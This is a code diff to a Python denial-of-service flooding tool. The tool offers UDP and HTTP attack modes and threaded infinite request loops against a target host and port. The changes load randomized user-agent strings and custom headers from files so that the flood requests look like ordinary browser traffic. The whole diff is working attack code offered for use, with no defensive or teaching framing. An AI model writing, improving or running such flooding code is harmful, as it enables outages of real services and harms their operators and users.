@@ -5,23 +5,18 @@ import urllib.request
 
 def user_agent():
     global uagent
-    uagent = []
-    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
-    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
-    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
-    uagent.append(
-        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-    uagent.append(
-        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
-    uagent.append(
-        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
-    uagent.append("Mozilla / 5.0(X11;Linux i686; rv:81.0) Gecko / 20100101 Firefox / 81.0")
-    uagent.append("Mozilla / 5.0(Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
-    uagent.append("Mozilla / 5.0(X11;Ubuntu;Linuxi686;rv:81.0) Gecko / 20100101Firefox / 81.0")
-    uagent.append("Mozilla / 5.0(X11;Ubuntu;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
-    uagent.append("Mozilla / 5.0(X11;Fedora;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
-    return (uagent)
+
+    uagents = open("useragents.txt", "r")
+    uagent = uagents.readlines()
+    uagents.close()
+    return uagent
+
+#
+# def user_agent():
+#     global uagent
+#     uagent = []
+#     uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36")
+#     return (uagent
 
 
 def headers():
@@ -29,6 +24,18 @@ def headers():
     global data
     headers = open("headers.txt", "r")
     data = headers.read()
+    headers.close()
+
+
+def set_headers_dict():
+    # reading headers
+    global headers_dict
+    headers = open("headers.txt", "r")
+    content = headers.readlines()
+    headers_dict = {}
+    for item in content:
+        parts = item.split(':')
+        headers_dict[parts[0]] = parts[1].strip()
     headers.close()
 
 
@@ -80,14 +87,17 @@ def down_it_udp():
 
 def down_it_http():
     while True:
-        try:
-            protocol = 'http://'
-            if port == 443:
-                protocol = 'https://'
+        protocol = 'http://'
+        if port == 443:
+            protocol = 'https://'
 
-            url = f"{protocol}{host}:{port}"
+        url = f"{protocol}{host}:{port}"
+        http_headers = headers_dict
+        http_headers['User-Agent'] = random.choice(uagent).strip()
+
+        try:
             urllib.request.urlopen(
-                urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)})
+                urllib.request.Request(url, headers=http_headers)
             )
         except:
             print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
@@ -119,6 +129,7 @@ def get_parameters():
     global item
     global random_packet_len
     global attack_method
+    global headers_dict
     optp = OptionParser(add_help_option=False, epilog="Rippers")
     optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
     optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
@@ -199,6 +210,7 @@ if __name__ == '__main__':
         if attack_method == 'udp':
             thrs.append(threading.Thread(target=down_it_udp))
         elif attack_method == 'http':
+            set_headers_dict()
             thrs.append(threading.Thread(target=down_it_http))
         thrs[i].daemon = True  # if thread is exist, it dies
         thrs[i].start()
